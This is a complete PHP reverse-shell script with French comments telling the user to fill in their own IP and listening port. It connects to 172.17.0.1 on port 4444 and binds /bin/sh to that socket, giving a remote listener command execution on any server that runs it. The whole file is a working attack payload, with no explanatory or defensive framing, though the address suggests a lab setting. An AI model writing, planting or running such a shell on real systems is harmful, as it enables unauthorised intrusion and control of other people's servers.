<?php
$ip = "172.17.0.1"; // Remplace par ton IP
$port = 4444; // Choisis un port d'écoute

$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
